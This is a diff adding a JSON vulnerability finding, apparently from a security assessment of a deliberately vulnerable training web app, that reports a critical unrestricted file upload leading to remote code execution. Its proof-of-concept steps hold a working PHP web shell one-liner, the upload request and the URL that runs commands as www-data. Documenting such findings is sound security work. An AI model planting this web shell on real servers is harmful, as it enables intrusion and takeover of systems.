@@ -1,0 +1,11 @@
+{
+  "title": "Unrestricted File Upload - Remote Code Execution",
+  "severity": "Critical",
+  "location": "/vulnerabilities/upload/",
+  "proof": "Uploaded PHP files (shell.php, shell.phtml) via form to /vulnerabilities/upload/. Both confirmed accessible and executable at /hackable/uploads/shell.php?cmd=id returning 'uid=33(www-data)'. No file type verification - PHP and PHTML extensions accepted. Shell provides full RCE as www-data.",
+  "poc_steps": [
+    "Create file with content <?php echo system($_GET['cmd']); ?>",
+    "POST /vulnerabilities/upload/ with uploaded=@shell.php",
+    "Access /hackable/uploads/shell.php?cmd=id"
+  ]
+}
